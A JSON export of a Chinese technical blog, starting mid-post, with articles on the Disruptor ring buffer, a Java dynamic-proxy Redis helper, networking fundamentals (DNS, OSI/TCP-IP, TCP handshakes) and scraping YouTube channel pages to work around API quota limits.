1.对消费者共享队列进行下一个Next的CAS抢占，以及对自己消费进度的队列标记当前进度。 2.为自己申请可读的RingBuffer的Next位置，这里的申请不仅仅是申请到next，有可能会申请到比Next大的一个范围，阻塞策略的申请的过程如下: 获取生产者对RingBuffer最新写的位置 判断其是否小于我要申请读的位置 如果大于则证明这个位置已经写了，返回给生产者。 如果小于证明还没有写到这个位置，在阻塞策略中会进行阻塞，其会在生产者提交阶段进行唤醒。 3.对这个位置进行可读校验，因为你申请的位置可能是连续的，比如生产者目前在7，接下来申请读，如果消费者已经把8和10这个序列号的位置写进去了，但是9这个位置还没来得及写入，由于第一步会返回10，但是9其实是不能读的，所以得把位置向下收缩到8。 4.如果收缩完了之后比当前next要小，则继续循环申请。 5.交给handler.onEvent()处理 一样的我们举个例子，我们要申请next=8这个位置。 1.首先在共享队列抢占进度8，在独立队列写入进度7 2.获取8的可读的最大位置，这里根据不同的策略进行，我们选择阻塞，由于生产者生产了8，9，10，所以返回的是10，这样和后续就不需要再次和avaliableBuffer进行对比了。 3.最后交给handler进行处理。 4.Log4j中的Disruptor下面的图展现了Log4j使用Disruptor,ArrayBlockingQueue以及同步的Log4j吞吐量的对比，可以看见使用了Disruptor完爆了其他的，当然还有更多的框架使用了Disruptor，这里就不做介绍了。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"动态代理在代码中的应用","slug":"proxy","date":"2020-01-10T16:00:00.000Z","updated":"2020-10-25T08:26:34.000Z","comments":true,"path":"proxy/","link":"","permalink":"https://gschaos.club/proxy/","excerpt":"动态代理在代码中的应用","text":"动态代理在代码中的应用 动态代理在代码中的应用. 先看一段代码 MixedRedisHelperFactoryBean: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@Componentpublic class MixedRedisHelperFactoryBean implements FactoryBean&lt;MixedRedisHelper&gt;, InitializingBean, InvocationHandler &#123; @Autowired private ShardedJedisTemplate shardedJedisTemplate; @Autowired private JedisClusterTemplate jedisClusterTemplate; private MixedRedisHelper helper; @Override public void afterPropertiesSet() throws Exception &#123; helper = (MixedRedisHelper) Proxy.newProxyInstance(MixedRedisHelperFactoryBean.class.getClassLoader(), new Class&lt;?&gt;[]&#123;MixedRedisHelper.class&#125;, this); &#125; @Override public MixedRedisHelper getObject() throws Exception &#123; return helper; &#125; @Override public Class&lt;?&gt; getObjectType() &#123; return MixedRedisHelper.class; &#125; @Override public boolean isSingleton() &#123; return true; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (Object.class.equals(method.getDeclaringClass())) &#123; return method.invoke(this, args); &#125; Object target; //根据开关来决定使用啥shard：cluster if (ConfigManager.getBoolean(&quot;redis.cluster.standalone&quot;, false)) &#123; target = jedisClusterTemplate; &#125; else &#123; target = shardedJedisTemplate; &#125; return method.invoke(target, args); &#125;&#125; MixedRedisHelper: 123public interface MixedRedisHelper extends JedisCommands &#123;&#125; ShardedJedisTemplate: 1234public interface ShardedJedisTemplate extends JedisCommands, Closeable, BinaryJedisCommands &#123; List&lt;?&gt; pipelined(PipelineHandler handler);&#125; JedisClusterTemplate: 12345public interface JedisClusterTemplate extends BasicCommands, BinaryJedisClusterCommands, MultiKeyBinaryJedisClusterCommands, JedisClusterBinaryScriptingCommands, JedisCommands, MultiKeyJedisClusterCommands, JedisClusterScriptingCommands &#123;&#125; InitializingBean就是一个初始化类需要重写afterPropertiesSet()；就当是@postconstruct； 所以此处的代码是在类初始化的时候初始化了一个MixedRedisHelperFactoryBean，从它实现FactoryBean可以知道它是用来生成MixedRedisHelper，就是说在使用@Autowired注解使用MixedRedisHelper的时候会使用此Factory生产的MixedRedisHelper的实例。 在来看它的初始方法 12345@Override public void afterPropertiesSet() throws Exception &#123; helper = (MixedRedisHelper) Proxy.newProxyInstance(MixedRedisHelperFactoryBean.class.getClassLoader(), new Class&lt;?&gt;[]&#123;MixedRedisHelper.class&#125;, this); &#125; 这里使用了动态代理。。Proxy的用法请google。所以此Factory中的MixedRedisHelper对象是有代理生成的，也即我们执行MixedRedisHelper这个对象实例的时候会执行invoke方法。 123456789101112131415@Overridepublic Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (Object.class.equals(method.getDeclaringClass())) &#123; return method.invoke(this, args); &#125; Object target; //根据开关来决定使用啥shard：cluster if (ConfigManager.getBoolean(&quot;redis.cluster.standalone&quot;, false)) &#123; target = jedisClusterTemplate; &#125; else &#123; target = shardedJedisTemplate; &#125; return method.invoke(target, args);&#125; 这里的invoke又使用了注入JedisClusterTemplate，ShardedJedisTemplate，这样就达到了通过配置文件来区分使用哪个，其中还有其他的请等等。。 待续！","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"浏览器","slug":"connect","date":"2020-01-10T16:00:00.000Z","updated":"2020-10-25T08:23:13.000Z","comments":true,"path":"connect/","link":"","permalink":"https://gschaos.club/connect/","excerpt":"从输入一个地址开始，它可以是这样的 www.baidu.com, 也可以是这样的 https://admin:admin@www.gschaos.club:80/dir/file1.html, 咋一看好像都能看懂,而且还知道这么输入会得到什么,更言之还能断点调试一下; 可是输入一个网址到底发生了什么？","text":"从输入一个地址开始，它可以是这样的 www.baidu.com, 也可以是这样的 https://admin:admin@www.gschaos.club:80/dir/file1.html, 咋一看好像都能看懂,而且还知道这么输入会得到什么,更言之还能断点调试一下; 可是输入一个网址到底发生了什么？ 浏览器 从输入一个地址开始，它可以是这样的 www.baidu.com, 也可以是这样的 https://admin:admin@www.gschaos.club:80/dir/file1.html, 咋一看好像都能看懂,而且还知道这么输入会得到什么,更言之还能断点调试一下; URL我们先来看下URL,URL有很多种,不止我们常用到的http://,还有很多比如“file:” (读取本地文件) , “ftp:”(文件传输协议) , “mailto:”(邮件服务,需要配置正确的电子邮箱)等. 它们拥有同样的格式,即都需要定义一个访问方法(协议http,ftp等). 那么知道这些后浏览器做了什么呢? 浏览器解析URL浏览器首先对URL进行解析,从而生成发送给服务器的请求信息.依据不同的协议访问不同的服务器,这里阐述访问Web服务器的情况. 解析方式如下: 有时候进入主页的时候文件名经常不写比如http://www.lab.com/dir/,那么解析的时候就会去寻找目录下面的default.html或者index.html具体访问什么要看服务器如何配置.当不写最后一个**/**时,是会先寻找文件夹,再寻找文件名的规则来进行的. 明白了URL，我们来对URL中HTTP进行简单的说明。 HTTP协议HTTP协议定义了客户端和服务器之间交互的消息内容和步骤,请求中包含了对什么和做什么两个部分; 对什么: 这部分就是URI(统一资源标识符),一般来说,URI的内容是一个存放网页数据的文件名或者是一个CGI程序的文件名.例如/dir/file1.html;不过,URI不仅限于此,也可以直接用”http:”开头的URL来作为URI.换句话就是,这里可以写各种访问目标,而这些访问目标统称为URI. 做什么: 也称为方法.表示需要Web服务器做什么,典型的例子包括读取URI表示的数据/将客户端输入的数据发送给URI表示的程序等. 看到这张图是不是就对之前所解释的做什么有所了解了呢! 收到消息之后,Web服务器会对其中的内容进行解析,通过URI和方法来判断“对什么”,”做什么”,并根据这些要求完成工作将结果放入响应消息中. 至此我们了解了HTTP的全貌,之后会一步步往下深入网络到底是怎么连接的.. 当我们想寄一封信件的时候，我们需要能够帮助我们送信的机构，如果要自己送去那还送信做什么，直接过去把寄信人打一顿就完事了；所以就有了邮局(快递的你先放下…)，每个人都可以将信委托给邮局，让邮局帮我们将信件寄出去。我们发送一个网络请求也是，每个应用都可以发送网络请求，同样需要一个能够将消息发送到网络的机构，这个机构由操作系统来完成组建。所以，浏览器解析URL生成HTTP请求后需要委托操作系统将这些消息发送到网络。 当然，邮局也会要求我们填写一个寄信单，这个单子包括了寄信人的地址，寄信人的联系方式，收信人的地址，收信人的联系方式4个重要的信息(还有其他附加信息),填写正确才能将信件成功寄出。操作系统发送消息也是如此，它需要的是收信人的地址【对方的IP地址】，收信人的联系方式【对方的端口号】。发送方的自然也需要，只是两者绑定在一起，开机的那一刻就已经存在内存中了。 在这之前，来了解一下IP地址是啥子。 IP地址住在有门牌号的房子的大伙都知道(如果没有，请默哀两分钟！)，寄发信件的时候需要填写自己和对方的具体地址，而这个地址就是小区的某个房间的门牌号，完整的地址包括了国家，省份市直辖区，县/区，乡镇小区等等。国家与国家之间形成了不同的区域，说中国在哪，一定会有答案，再往下，省市区小区直到门牌号，它就像一个唯一的号牌将这个地址标记出来。 IP地址同样是这样的道理。 互联网和公司内部的局域网都是基于TCP/IP的思路来设计的，如上图，就是由一些小的子网(小区甚至楼层之间)，通过路由器连接起来。这里的子网可以理解成为用集线器连接起来的几台计算机，将它看作一个单位，称为子网。将子网连接起来，就形成了一个网络。 你要说怎么理解，那看下面这张图吧(自己画的可能不准确！)。 在网络中所有的设备都会被分配一个地址。就好像是XX号XX室。其中号对应的号码是分配给整个子网的，而室对应的号码是分配给子网中的计算机的，这就是网络中的地址。号对应的号码称为网络号，室对应的号码称为主机号，这个地址的整体称为IP地址。发送者发送的消息首先经过子网中的集线器，转发到距离最近的路由器上。接下来，路由器会根据消息的目的地判断下一个路由去的位置，然后将消息发送到下一个路由器，即消息再次经过子网内的集线器被转发到下一个路由器。前面的过程不断重复，最终消息就被传到了目的地。这个过程就好像你准备好信件由邮局寄出，邮局寄出后会送往下一站，再由下一站判断你的目的地，再往下送一样； 那么这个地址到底是怎么组成的呢？ 如上图，实际的IP地址是一串32比特的数字，按照1个字节为一组分成4组，分别用十进制表示然后再用圆点隔开。在IP地址的规则中，网络号和主机号连接起来总共是32比特，但这两部分的具体结构是不固定的。在组建网络时，用户可以自行决定他们之间的分配关系，因此，这里还需要另外的附加信息来表示IP地址的内部结构。 这个附加信息就是子网掩码。子网掩码的格式如下图，是一串与IP地址长度相同的32比特数字，左边一半全是1，代表网络号，右边一半全是0，代表主机号。 DNS那么要怎么得到域名对应的IP地址呢？? 按照开发的思路，要得到域名对应的IP地址，那肯定需要一个key-value的内存表来记录域名key对应的IP地址value，这样取出来即可，可是….这个表在哪里？ 这就要涉及到DNS域名服务器，浏览器委托操作系统先去DNS域名服务器查询域名对应的IP地址，服务器返回需要IP，然后我们就可以用这个IP发送消息了。 等等！我怎么访问DNS域名服务器的？我..我怎么知道它的IP的？？ 参考DNS 原理入门以及如果你听英文可以听得懂的话 AWS的‘什麼是 DNS’？； 首先，本机一定要知道DNS服务器的IP地址，否则上不了网。通过DNS服务器，才能知道某个域名的IP地址到底是什么。 DNS服务器的IP地址，有可能是动态的，每次上网时由网关分配，这叫做DHCP机制；也有可能是事先指定的固定地址。Linux系统里面，DNS服务器的IP地址保存在/etc/resolv.conf文件。 有一些公网的DNS服务器，也可以使用，其中最有名的就是Google的8.8.8.8和Level 3的4.2.2.2。 在linux系统总可以使用dig match 域名 来查看使用的DNS服务器IP地址。 域名的层级结构如下 ： 12345主机名.次级域名.顶级域名.根域名# 即host.sld.tld.root DNS服务器根据域名的层级，进行分级查询。 就是从根域名开始，依次查询每一级域名的NS记录，直到查到最终的IP地址，过程大致如下。 从”根域名服务器”查到”顶级域名服务器”的NS记录和A记录（IP地址） 从”顶级域名服务器”查到”次级域名服务器”的NS记录和A记录（IP地址） 从”次级域名服务器”查出”主机名”的IP地址 “根域名服务器”的NS记录和IP地址一般是不会变化的，所以内置在DNS服务器里面。 我们只要知道连接网络需要ip地址，而域名如何解析成ip地址需要DNS域名服务器，而这个DNS域名服务器在设置网络连接的时候已经配置好，即已存在这个IP地址即可。 知道了对方的IP地址，要怎么才算连接呢？以编程者的思想连接如下图所示。 我们这里不需要知道编程怎么实现，因为不管是哪种编程它们都是在委托操作系统在发送信息，所以基本流程如下图。 这里解释下这张图！ 上文中我们知道连接互联网的重任不是应用自己连接，而是委托给操作系统来执行连接，浏览器或者应用程序调用Socket发起一个连接就是一次创建Socket(FD)套接字的过程。 首先，分配一个内存空间用以存储套接字信息，然后，将表示这个套接字的描述符告知应用程序。 那何为套接字描述符呢?在这之前想考一个问题，在计算机中同一时间进行通信操作的应用程序不止一个，这时，我们就需要一种方法来识别出某个特定的套接字，这种方法就是描述符。我们可以理解描述符是给某个套接字分配的唯一编号。当我们使用某个套接字来执行收发数据的操作时，就可以出示所拥有的描述符，协议栈就能够判断出我们希望用哪一个套接字来连接或者发送数据了。在win中使用netstat命令查看系统套接字内容，如下图(这张图是盗来的)： 图中每一行相当于一个套接字，当创建套接字时，就会增加一行控制信息，赋予“即将开始通信”的状态，并进行通信的准备工作，如分配用于临时存放手法数据的缓冲区空间。 接着Socket调用connect连接服务器，这个时候协议栈并不知道要和谁通信，在服务器端甚至应用程序要和谁连接都不晓得，这样下去都不知道咋整。所以，发起连接的一方需要告知被连接方一些必要的信息，比如“halo，我需要和你通奸…..哦不! 需要和你通信，这是我的房间号(ip+端口)，记得回信息哦，我在等着你呢！”。这样双方才知道互连的通信是谁，才能顺利的进行收发数据。 其实就是男女双方需要交换一些个性信息才好继续沟通下去。 那么，它们如何沟通呢？ 需要的前提大部分已经凑齐，开始通信之前我们需要了解一下TPC/IP模型。 网络模型不是一开始就有的，在网络刚发展时，网络协议是由各互联网公司自己定义的，各家的协议也是不能互通的。这样大大的阻碍了互联网的发展，为了解决这个问题，国际标准化组织 1984 提出的模型标准，简称 OSI（Open Systems Interconnection Model）。具体如下图： OSI七层模型每一层都有自己的作用，从上到下的作用依次为： 应用层(Application) :提供网络与用户应用软件之间的接口服务 表示层(Presentation) :提供格式化的表示和转换数据服务，如加密和压缩 会话层(Session) 提供包括访问验证和会话管理在内的建立和维护应用之间通信的机制 传输层(Transimission):提供建立、维护和取消传输连接功能，负责可靠地传输数据(PC) 网络层(Network): 处理网络间路由，确保数据及时传送(路由器) 数据链路层(DataLink): 负责无错传输数据，确认帧、发错重传等(交换机) 物理层(Physics) :提供机械、电气、功能和过程特性(网卡、网线、双绞线、同轴电缆、中继器) 七层中应用层、表示层和会话层由软件控制，传输层、网络层和数据链路层由操作系统控制，物理层有物理设备控制。 2 TCP/IP参考模型及协议1) 模型TCP/IP 模型是由 OSI 模型演化而来，TCP/IP 模型将 OSI 模型由七层简化为五层（一开始为四层），应用层、表示层、会话层统一为应用层。 2) 协议TCP/IP协议被称为传输控制协议/互联网协议，又称网络通讯协议(Transmission Control Protocol)。是由网络层的IP协议和传输层的TCP协议组成，是一个很大的协议集合。 物理层和数据链路层没有定义任何特定协议，支持所有的标准和专用的协议。 网络层定义了网络互联也就是IP协议，主要包括IP、ARP、RARP、ICMP、IGMP。 传输层定义了TCP和UDP(User Datagram Protocol)，我们会后面重点介绍一下TCP协议。 应用层定义了HTTP(超文本传输协议)、FTP(文件传输协议)、DNS(域名系统)等协议。 3 物理层计算机在传递数据的时候传递的都是0和1的数字，而物理层关心的是用什么信号来表示0和1，是否可以双向通信，最初的连接如何建立以及完成连接如何终止,总之，物理层是为数据传输提供可靠的环境。 4 数据链路层数据链路层们于物理层和网络层之间，用来向网络层提供数据，就是把源计算机网络层传过来的信息传递给目标主机。数据链路层主要的作用包括： 如何将数据组合成数据帧(Frame)，帧是数据链路层的传输单位 数据链路的建立、维护和拆除 帧包装、帧传输、帧同步 帧的差错恢复 流量控制 5 网络层网络层位于传输层和数据链路层之间,用于把数据从源主机经过若干个中间节点传送到目标主机,并向传输层提供最基础的数据传输服务,它要提供路由和选址的工作。 那什么是路由和选址呢？ 选址 交换机是靠MAC来寻址的，而因为MAC地址是无层次的,所以要靠IP地址来确认计算机的位置,这就是选址。 路由 在能够选择的多条道路之间选择一条最短的路径就是路由的工作。 路由和选址都离不开IP，我们就详细介绍一下IP头部。 IP头IP头部是由20个字节组成的，具体项所占的位数如下图： 具体的数据我们用Wireshark来表抓取一下，如图（蓝色部分为IP数据包）： version - 版本 Header Length - 首部长部 Differentiated Services Field - 优先级与服务类型 Total Length - 总长度，该字段用以指示整个IP数据包的长度，最长为65535字节，包括头和数据。 Identification - 标识符，唯一标识主机发送的每一份数据报。 Flags - 标志。分为3个字段，依次为保留位、不分片位和更多片位 Fragment offset - 段偏移量。该分片相对于原始数据报开始处位置的偏移量。 TTL(Time to Live生存时间) - 该字段用于表示IP数据包的生命周期，可以防止一个数据包在网络中无限循环地发下去。TTL的意思是一个数据包在被丢弃之前在网络中的最大周转时间。该数据包经过的每一个路由器都会检查该字段中的值，当TTL的值为0时此数据包会被丢弃。TTL对应于一个数据包通过路由器的数目，一个数据包每经过一个路由器，TTL将减去1。 Protocol - 协议号。用以指示IP数据包中封装的是哪个协议。 Header checksum - 首部校验和。检验和是16位的错误检测字段。目的主机和网络中的每个网关都要重新计算报头的校验和，如果一样表示没有改动过。 Source - 源IP地址。该字段用于表示数据包的源地址，指的是发送该数据包的设备的网络地址。 Destination - 目标IP地址。该字段用于表示数据包的目标的地址，指的是接收节点的网络地址。 6 传输层传输层是面向连接的、可靠的的进程到进程通信的协议。TCP提供全双工服务，即数据可在同一时间双向传播。TCP将若干个字节构成一个分组，此分组称为报文段(Segment)。提供了一种端到端的连接。 传输层的协议主要有TCP 和 UDP，TCP(Transimision Control Protocal)是一种可靠的、面向连接的协议，传输效率低。UDP(User Datagram Protocal)是一种不可靠的、无连接的服务，传输效率高。下面重点介绍一下TCP的三次握手和四次挥手。 1) TCP的功能TCP主要是将数据进行分段打包传输，对每个数据包编号控制顺序，运输中丢失、重发和丢弃处理。 2) TCP头的介绍有点和IP头类似，我们先来张图看下： Source Port &amp; Destination Port - 源端口号和目标端口号;计算机通过端口号识别访问哪个服务,比如http服务或ftp服务;发送方端口号是进行随机端口;目标端口号决定了接收方哪个程序来接收。 Sequence number - 32位序列号，TCP用序列号对数据包进行标记，以便在到达目的地后重新重装。在建立连接时通常由计算机生成一个随机数作为序列号的初始值。 Acknowledgment number - 32位确认号，确认应答号。发送端接收到这个确认应答后，可以认为这个位置以前所有的数据都已被正常接收。 Header Length - 首部长度。单位是 ‘4’个’字节’，如果没有可选字段，那么这里的值就是 5。表示 TCP 首部的长度为 20 字节。 checksum - 16位校验和。用来做差错控制，TCP校验和的计算包括TCP首部、数据和其它填充字节。 flags - 控制位。TCP的连接、传输和断开都受这六个控制位的指挥 window size - 本地可接收数据的数目，这个值的大小是可变的。当网络通畅时将这个窗口值变大加快传输速度，当网络不稳定时减少这个值可以保证网络数据的可靠传输。它是来在TCP传输中进行流量控制的 3) 传说中的三次握手和四次挥手（抓包演示）三次握手和四次挥手到底是怎么回事呢，我用一台主机A（172.16.50.72:65076）起一个服务，另外一台主机B（172.16.17.94:8080）请求一下。在A主机上启动node服务： 12345678910111213141516171819let http = require(&#x27;http&#x27;);let url = require(&#x27;url&#x27;);let server = http.createServer();server.on(&#x27;request&#x27;, (req, res) =&gt; &#123; let &#123;pathname, querry&#125; = url.parse(req.url, true); let result = []; req.on(&#x27;data&#x27;, (data) =&gt; &#123; result.push(data); &#125;) req.on(&#x27;end&#x27;, () =&gt; &#123; console.log(Buffer.concat(result).toString()); res.end(&#x27;hello world&#x27;); &#125;)&#125;)server.listen(8080, () =&gt; &#123; console.log(&#x27;server started&#x27;);&#125;); B主机连接A并发送数据： 1curl -d &quot;user&quot;:&quot;lucy&quot; 172.16.17.94:8080 用wireshark抓包演示一下。如下图： 上图中A为三次握手，B为数据传输，C为四次挥手。下面我们详细介绍一下这三个部分。 首先我们先图解一下wireshark抓到的数据，如下图： 我们把这个过程分为三部分，第一部分为三次握手建立连接，第二部分为数据传输，第三次为四次挥手断开连接。 三次握手 我们分析一下三次握手的过程（包括ack 和 seq的值变化）。 为了方便描述我们将主动发起请求的172.16.17.94:8080 主机称为客户端，将返回数据的主机172.16.17.94:8080称为服务器，以下也是。 第一次握手: 建立连接。客户端发送连接请求，发送SYN报文，将seq设置为0。然后，客户端进入SYN_SEND状态，等待服务器的确认。 第二次握手: 服务器收到客户端的SYN报文段。需要对这个SYN报文段进行确认，发送ACK报文，将ack设置为1。同时，自己还要发送SYN请求信息，将seq为0。服务器端将上述所有信息一并发送给客户端，此时服务器进入SYN_RECV状态。 第三次握手: 客户端收到服务器的ACK和SYN报文后，进行确认，然后将ack设置为1，seq设置为1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 数据传输 客户端先向服务器发送数据，该数据报是lenth为159的数据。 服务器收到报文后, 也向客户端发送了一个数据进行确认（ACK），并且返回客户端要请求的数据，数据的长度为111，将seq设置为1，ack设置为160（1 + 159）。 客户端收到服务器返回的数据后进行确认（ACK），将seq设置为160， ack设置为112（1 + 111）。 四次挥手 当客户端和服务器通过三次握手建立了TCP连接以后，当数据传送完毕，就要断开TCP连接了，就有了神秘的“四次挥手”。 第一次挥手：客户端向服务器发送一个FIN报文段，将设置seq为160和ack为112，;此时，客户端进入 FIN_WAIT_1状态,这表示客户端没有数据要发送服务器了，请求关闭连接; 第二次挥手：服务器收到了客户端发送的FIN报文段，向客户端回一个ACK报文段，ack设置为1，seq设置为112;服务器进入了CLOSE_WAIT状态，客户端收到服务器返回的ACK报文后，进入FIN_WAIT_2状态; 第三次挥手：服务器会观察自己是否还有数据没有发送给客户端，如果有，先把数据发送给客户端，再发送FIN报文；如果没有，那么服务器直接发送FIN报文给客户端。请求关闭连接，同时服务器进入LAST_ACK状态; 第四次挥手：客户端收到服务器发送的FIN报文段，向服务器发送ACK报文段，将seq设置为161，将ack设置为113，然后客户端进入TIME_WAIT状态;服务器收到客户端的ACK报文段以后，就关闭连接;此时，客户端等待2MSL后依然没有收到回复，则证明Server端已正常关闭，客户端也可以关闭连接了。 注意：在握手和挥手时确认号应该是对方序列号加1,传输数据时则是对方序列号加上对方携带应用层数据的长度。 7 应用层应用层常见协议有HTTP、HTTPS 、FTP 、SMTP等。 TCP/IP模型我们基本介绍完了，那层与层之间是怎样合作和分工的呢，我们用两张图介绍一下：发送方的数据是从上往下传输的，即从应用层向物理层传输。接收方的数据是从下往上传输的，即从物理层向应用层传输。如下两张图。 发送方是从高层到低层封装数据： 在应用层要把各式各样的数据如字母、数字、汉字、图片等转换成二进制 在TCP传输层中，上层的数据被分割成小的数据段，并为每个分段后的数据封装TCP报文头部 在TCP头部有一个关键的字段信息端口号，它用于标识上层的协议或应用程序，确保上层数据的正常通信 计算机可以多进程并发运行，例如在发邮件的同时也可以通过浏览器浏览网页，这两种应用通过端口号进行区分 在网络层，上层数据被封装上亲的报文头部(IP头部)，上层的数据是包括TCP头部的。IP地址包括的最关键字段信息就是IP地址，用于标识网络的逻辑地址。 数据链路径层，上层数据成一个MAC头部，内部有最关键的是MAC地址。MAC地址就是固化在硬件设备内部的全球唯一的物理地址。 在物理层，无论在之前哪一层封装的报文头和还是上层数据都是由二进制组成的，物理将这些二进制数字比特流转换成电信号在网络中传输 接收方是从低层到高层解封装 数据封装完毕传输到接收方后，将数据要进行解封装 在物理层，先把电信号转成二进制数据，并将数据传送至数据链路层 在数据链路层，把MAC头部拆掉，并将剩余的数据传送至上一层 在网络层，数据的IP头部被拆掉，并将剩余的数据送至上一层 在传输层，把TCP头部拆掉，将真实的数据传送至应用层 我严重怀疑你在拖文章长度","categories":[{"name":"网络是怎么连接的","slug":"网络是怎么连接的","permalink":"https://gschaos.club/categories/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%9E%E6%8E%A5%E7%9A%84/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://gschaos.club/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"如何在YouTube Api限额的情况下获取更多视频","slug":"YouTube","date":"2019-12-27T16:00:00.000Z","updated":"2020-10-25T08:28:35.000Z","comments":true,"path":"YouTube/","link":"","permalink":"https://gschaos.club/YouTube/","excerpt":"如何在YouTube Api限额的情况下获取更多视频","text":"如何在YouTube Api限额的情况下获取更多视频 YouTube视频谷歌限制了YouTube api v3的请求量，一天10000配额，这里不是10000次请求，每次请求根据不同参数消耗不同配额。为了摆脱这种限制而获得更多的新发布视频，做了以下内容的方案。 需求：运营配置YouTube的channelId，后台需要根据这些channelId去获取最近发布的可以在小屏播放的video信息，以增加用户活度。 问题：YouTube限额问题，谷歌限制域名只能使用一个ApiKey，配置多会被封禁，按照现有全部用api检索会导致频道越配越多，获得的视频越来越少。 解决：思路1：出于问题中关键点，系统不知道channel下面发布的情况，只能被动查询，这样可能会导致查询消耗了配置结果返回为空或者很少视频的情况；所以考虑使用订阅模式去事先得知频道的情况。 查找了很多资料；最坑的竟然是YouTube api官网给的方法。。。。(youtubeApi)。我试着去使用它介绍的发布订阅，对于Google的集线器我研究了很久，毕竟不熟悉，而且没有相关的java实现。 方式1：1.启动自己的回调服务器，随便弄个可以外网访问的服务返回200和请求参数中的hub_chanlenge即可。 2.订阅你需要订阅的频道的atom：类似：https://www.youtube.com/xml/feeds/videos.xml?channel_id=CHANNEL_ID 这种。 3.返回204即成功。 我的尝试：我使用的自己的云服务器，使用谷歌的集线器，然后去订阅YouTube，发现509等错误，莫名其妙后使用了自己写的atom作为发布方，结果成功了。不过，可笑的是，这个集线器它并不能正常工作，我在修改atom再次发布的时候，它竟然没能好好工作；没向我的回调函数发送信息。我崩溃了，我去谷歌搜索了很多相关问题，发现YouTube已经不将视频信息发布到上面所说的xml中了，而且在这之前YouTube为了用户体验，每个频道只发送3条消息给订阅用户(YouTube自带的那个铃铛订阅)我去你….. 方式2：再对问题思考，依然摆脱不了需要提前得知频道下视频的发布情况，我试着去YouTube网站videos下查看视频与api返回的视频做对照，发现可以使用解析http的标签获取发布的视频和时间(其实一开始也想过使用爬虫，奈何怕蹲牢啊。。)。我试着使用httpClient解析这个页面，果然得到了我想要的答案。 这样我就可以提前知道频道的发布情况，进而对使用api检索得到的结果有了大的优化。相关代码如下： YouTubeTest 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293public class YoutubeTest &#123; private static String matching = &quot;&lt;/li&gt;&lt;li&gt;&quot;; private final static String CONTENT = &quot;class=\\&quot;yt-lockup-content\\&quot;&quot;; private static final String GET_VEDIO_INFO_PRE = &quot;https://youtube.com/get_video_info?video_id=&quot;; public static void main(String[] args) throws Exception &#123; http(&quot;UC24_Z2L-8Ki183AI9zJJzNQ&quot;); &#125; private static void http(String channelId) throws Exception &#123; String url = &quot;https://www.youtube.com/channel/&quot; + channelId + &quot;/videos&quot;; CloseableHttpClient httpclient = HttpClients.createDefault(); HttpGet httpget = new HttpGet(url); CloseableHttpResponse response = httpclient.execute(httpget); try &#123; HttpEntity entity = response.getEntity(); String responseYoutube = EntityUtils.toString(entity); List&lt;String&gt; countList = new ArrayList&lt;&gt;(100); int length = responseYoutube.length(); int i1, i2 = 0; long startTime = System.currentTimeMillis(); for (int i = 0; i &lt; length; i++) &#123; i1 = responseYoutube.indexOf(CONTENT, i); if (i1 &gt; 0) &#123; i2 = responseYoutube.indexOf(&quot;&lt;/div&gt;&quot;, i1); if (i2 &gt; 0) &#123; countList.add(responseYoutube.substring(i1, i2)); i = i2; &#125; &#125; else &#123; break; &#125; &#125; long endEachTime = System.currentTimeMillis(); System.out.println(&quot;遍历耗时：&quot; + (endEachTime - startTime) + &quot;ms&quot;); List&lt;VideoInfo&gt; videoInfos = new ArrayList&lt;&gt;(30); countList.forEach((s) -&gt; &#123; int hrefStart = s.indexOf(&quot;v=&quot;); int hrefEnd = s.indexOf(&quot;\\&quot;&quot;, hrefStart); VideoInfo videoInfo = new VideoInfo(); int lastIndex = s.indexOf(&quot;&lt;/li&gt;&lt;/ul&gt;&quot;); if (lastIndex &gt; 0) &#123; String substring = s.substring(s.indexOf(matching) + matching.length(), s.indexOf(&quot;&lt;/li&gt;&lt;/ul&gt;&quot;)); int time = analysisTime(substring); if (time == -2) &#123; System.out.println(channelId + &quot;返回参数中有解析错误的html标签:&quot; + s); &#125; videoInfo.setPublishTime(time); videoInfo.setVideoId(s.substring(hrefStart + 2, hrefEnd)); System.out.println(substring); videoInfos.add(videoInfo); &#125; &#125;); videoInfos.forEach(System.out::println); System.out.println(&quot;打印耗时：&quot; + (System.currentTimeMillis() - endEachTime) + &quot;ms&quot;); System.out.println(countList.size()); &#125; finally &#123; response.close(); &#125; &#125; private final static String CH_SECONDS_PRE = &quot;秒前&quot;; private final static String CH_MINUTES_PRE = &quot;分鐘前&quot;; private final static String CH_HOURS_PRE = &quot;小時前&quot;; private final static String CH_DAYS_PRE = &quot;天前&quot;; private static int analysisTime(String substring) &#123; boolean matches = substring.substring(0, 2).trim().matches(&quot;^[0-9]*[1-9][0-9]*$&quot;); int time=-2; if(matches)&#123; time = Integer.parseInt(substring.substring(0, 2).trim()); if (substring.contains(CH_SECONDS_PRE)) &#123; time = time + 0; &#125; else if (substring.contains(CH_MINUTES_PRE)) &#123; time = time + 100; &#125; else if (substring.contains(CH_HOURS_PRE)) &#123; time = time + 200; &#125; else if (substring.contains(CH_DAYS_PRE)) &#123; time = time + 300; &#125; else &#123; time = -1; &#125; &#125; return time; &#125; VideoInfo 12345678@Setter@Getter@ToStringpublic class VideoInfo &#123; private String videoId; private int publishTime;&#125; 这里使用的是香港，所以这里匹配获取时间的时候使用了繁体，解释下这里面的匹配规则。 class=”yt-lockup-content”是返回的html中视频主题标签的class，从此开始一个个获取。 analysisTime 秒则直接使用，分钟则为100起，以此类推。 其实在F12调试的时候，这个URL请求获得的是一段json，不知道为什么变成了html，对这方面不是很熟悉，之后会想办法去优化这块。 